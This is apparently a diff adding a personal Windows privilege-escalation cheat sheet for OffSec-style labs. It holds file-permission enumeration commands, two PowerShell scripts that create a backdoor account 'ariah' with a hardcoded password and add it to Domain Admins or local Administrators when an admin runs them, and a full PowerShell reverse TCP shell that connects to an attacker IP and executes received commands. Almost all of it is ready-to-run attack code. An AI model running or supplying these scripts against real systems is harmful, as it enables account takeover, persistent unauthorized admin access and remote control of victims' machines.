@@ -1,0 +1,73 @@
+Misconfigured Permissions on Files/Directories: 
+Check for writable system directories or files that can be exploited, like startup folders or PATH hijacking.
+
+Sample commands: 
+icacls C:\Windows\Tasks or similar paths
+dir /a /s /b C:\ | findstr /i /m "Everyone" "Users" to find overly permissive areas.
+
+
+
+
+************************************************************************************************************************
+Add User To Domain Admins PS1 Script
+************************************************************************************************************************
+# Save as AddAriahToDomainAdmins.ps1
+# Run by an admin → you become Domain Admin
+
+# Add user if it doesn't exist (just in case)
+net user ariah "AriahPass123!" /add /domain 2>$null
+
+# Add to Domain Admins
+net group "Domain Admins" ariah /add /domain
+
+Write-Output "[+] ariah is now a Domain Admin"
+Write-Output "    Verify: net group `"Domain Admins`" /domain"
+
+************************************************************************************************************************
+************************************************************************************************************************
+
+
+
+************************************************************************************************************************
+Add User To Local Admins PS1 Script
+************************************************************************************************************************
+# Save as AddAriahToLocalAdmins.ps1
+# Run by an admin → you become local admin on THIS machine only
+
+# Add user if it doesn't exist (just in case)
+net user ariah "AriahPass123!" /add 2>$null
+
+# Add to local Administrators group on this machine
+net localgroup Administrators ariah /add
+
+Write-Output "[+] ariah is now a local Administrator on this machine"
+Write-Output "    Verify: net localgroup Administrators"
+
+************************************************************************************************************************
+************************************************************************************************************************
+
+
+
+************************************************************************************************************************
+Rev Shell Port 80 PS1 Script
+************************************************************************************************************************
+# Save as RevShell80.ps1
+# Pure PowerShell reverse TCP shell (very reliable in OffSec labs)
+
+$ip   = "10.10.14.XX"   # ←←← CHANGE THIS TO YOUR KALI IP
+$port = 80
+
+$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{0}
+
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+    $sendback = (iex $data 2>&1 | Out-String )
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte,0,$sendbyte.Length)
+    $stream.Flush()
+}
+$client.Close()
+************************************************************************************************************************
